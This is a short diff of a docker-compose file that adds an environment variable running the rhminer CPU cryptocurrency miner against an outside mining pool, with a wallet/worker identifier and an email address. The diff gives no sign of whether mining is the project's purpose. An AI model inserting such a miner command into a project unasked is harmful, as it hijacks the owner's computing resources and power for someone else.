@@ -4,3 +4,5 @@ services:
     build:
       context: .
       dockerfile: Dockerfile
+    environment:
+      - RHMINER_CMD=./rhminer -v 2 -r 20 -s fastpool.xyz:10096 -su 111887-89.0.D/ceceptkj67@gmail.com -cpu
